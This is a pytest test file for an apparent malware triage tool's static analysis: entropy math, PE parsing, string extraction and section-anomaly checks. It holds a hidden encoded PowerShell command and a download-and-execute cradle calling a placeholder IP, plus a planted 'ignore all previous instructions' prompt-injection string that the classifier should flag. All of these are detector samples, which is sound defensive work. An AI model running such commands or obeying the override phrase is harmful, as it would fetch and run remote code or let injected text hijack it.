"""Static analysis: entropy math, PE parsing on our benign test binaries, strings, sections."""

import base64
import os
import random
from pathlib import Path

import pytest

from triage_agents.analysis.static import (
    HIGH_ENTROPY,
    classify_strings,
    decode_powershell_encoded,
    extract_strings,
    max_window_entropy,
    parse_pe,
    section_anomalies,
    shannon_entropy,
)

BIN = Path(__file__).resolve().parent.parent / "data" / "samples" / "bin"
KERNEL32 = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "kernel32.dll"


# ---------------------------------------------------------------- entropy


def test_entropy_of_constant_bytes_is_zero():
    assert shannon_entropy(b"\x00" * 1000) == 0.0
    assert shannon_entropy(b"") == 0.0


def test_entropy_of_two_equally_likely_values_is_one_bit():
    assert shannon_entropy(b"\x00\x01" * 500) == pytest.approx(1.0)


def test_entropy_of_all_256_values_equally_is_eight_bits():
    assert shannon_entropy(bytes(range(256)) * 4) == pytest.approx(8.0)


def test_random_bytes_are_near_eight_and_text_is_much_lower():
    rnd = random.Random(1).randbytes(65536)
    text = b"The quick brown fox jumps over the lazy dog. " * 500
    assert shannon_entropy(rnd) > 7.9
    assert shannon_entropy(text) < 4.5


def test_window_entropy_finds_a_small_blob_inside_plain_data():
    blob = random.Random(2).randbytes(4096)
    data = b"A" * 30000 + blob + b"B" * 30000
    assert shannon_entropy(data) < 3.0  # overall looks harmless
    assert max_window_entropy(data) > 7.5  # but one window is clearly random


# ---------------------------------------------------------------- PE parsing


def test_parse_pe_hello():
    r = parse_pe(BIN / "hello.exe")
    assert r["status"] == "success"
    assert r["is_64bit"] and not r["is_dll"]
    assert r["machine"] == "IMAGE_FILE_MACHINE_AMD64"
    assert ".text" in [s["name"] for s in r["sections"]]
    assert any(dll.upper() == "KERNEL32.DLL" for dll in r["imports"])
    assert len(r["sha256"]) == 64
    assert section_anomalies(r["sections"]) == []


def test_parse_pe_loader_demo_imports_dynamic_resolution_apis():
    r = parse_pe(BIN / "loader_demo.exe")
    functions = {fn for fns in r["imports"].values() for fn in fns}
    assert {"LoadLibraryA", "GetProcAddress"} <= functions


def test_parse_pe_high_entropy_blob_is_flagged():
    r = parse_pe(BIN / "high_entropy.exe")
    anomalies = section_anomalies(r["sections"])
    assert any(a["anomaly"] in {"high_entropy", "high_entropy_region"} for a in anomalies)


def test_parse_pe_rejects_non_pe(tmp_path):
    f = tmp_path / "notes.txt"
    f.write_text("definitely not a PE file")
    r = parse_pe(f)
    assert r["status"] == "error" and "PE" in r["error_message"]


def test_parse_pe_missing_file():
    assert parse_pe("does/not/exist.exe")["status"] == "error"


@pytest.mark.skipif(not KERNEL32.exists(), reason="Windows system DLL not available")
def test_parse_pe_windows_system_dll():
    r = parse_pe(KERNEL32)
    assert r["status"] == "success" and r["is_dll"]
    assert r["export_count"] > 1000  # kernel32 exports most of the Win32 API
    assert section_anomalies(r["sections"]) == []


# ---------------------------------------------------------------- strings


def test_extract_ascii_and_utf16_strings():
    data = b"\x00\x01hello world\x00\x02" + "wide string".encode("utf-16le") + b"\x00\x00ab\x00"
    found = extract_strings(data)
    assert "hello world" in found and "wide string" in found
    assert "ab" not in found  # shorter than min_len


def test_classify_strings_from_loader_demo():
    strings = extract_strings((BIN / "loader_demo.exe").read_bytes())
    hits = classify_strings(strings)
    assert any("update.example.invalid" in s for s in hits["url"])
    assert "registry_run_key" in hits
    assert "llm_prompt_injection" in hits  # the planted "ignore all previous instructions" note


def test_classify_strings_powershell_indicators():
    hits = classify_strings([
        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
    ])
    assert "encoded_command_flag" in hits
    assert "powershell_download" in hits
    assert "ipv4" in hits and "url" in hits


def test_classify_strings_ignores_ordinary_text():
    assert classify_strings(["Hello from the Triage Agents test suite.", "KERNEL32.dll"]) == {}


def test_decode_powershell_encoded_round_trip():
    encoded = base64.b64encode("Write-Output 'hi'".encode("utf-16le")).decode()
    assert decode_powershell_encoded(encoded) == "Write-Output 'hi'"
    assert decode_powershell_encoded("not base64!!") is None


# ---------------------------------------------------------------- sections from metadata


def test_section_anomalies_on_alert_metadata():
    sections = [
        {"name": "UPX0", "virtual_size": 65536, "raw_size": 0, "entropy": 0.0},
        {"name": "UPX1", "virtual_size": 40960, "raw_size": 40960, "entropy": 7.95},
        {"name": ".text", "virtual_size": 4096, "raw_size": 4096, "entropy": 6.2,
         "executable": True, "writable": True},
    ]
    kinds = {(a["section"], a["anomaly"]) for a in section_anomalies(sections)}
    assert ("UPX0", "packer_section_name") in kinds
    assert ("UPX0", "empty_on_disk") in kinds
    assert ("UPX1", "high_entropy") in kinds
    assert (".text", "writable_and_executable") in kinds
    assert HIGH_ENTROPY < 7.95
